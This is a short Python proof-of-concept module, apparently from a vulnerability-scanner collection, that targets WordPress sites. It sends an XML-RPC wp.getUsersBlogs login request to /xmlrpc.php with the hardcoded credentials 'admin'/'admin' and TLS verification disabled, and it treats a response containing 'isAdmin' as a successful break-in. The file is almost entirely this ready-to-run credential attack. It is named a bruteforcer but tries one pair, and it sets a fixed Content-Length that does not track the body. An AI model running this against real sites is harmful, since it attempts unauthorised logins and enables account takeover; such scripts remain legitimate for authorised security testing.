import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Wordpress XMLRPC.php username and password Bruteforcer''',
        "description": '''This template bruteforces username and passwords through xmlrpc.php being available.''',
        "severity": "high",
        "references": [
            "https://bugdasht.ir/reports/3c6841c0-ae4c-11eb-a510-517171a9198c", 
            "https://www.acunetix.com/vulnerabilities/web/wordpress-xml-rpc-authentication-brute-force/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "php", "xmlrpc", "fuzz"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        path = """/xmlrpc.php"""
        method = "POST"
        data = """<?xml version="1.0" encoding="UTF-8"?>
 <methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
     <param>
       <value>{username}</value>
     </param>
       <param>
     <value>{password}</value>
       </param>
   </params>
 </methodCall>""".format(username=username, password=password)
        headers = {'Content-Length': '235'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""url""" in resp0.text and """xmlrpc""" in resp0.text and """isAdmin""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url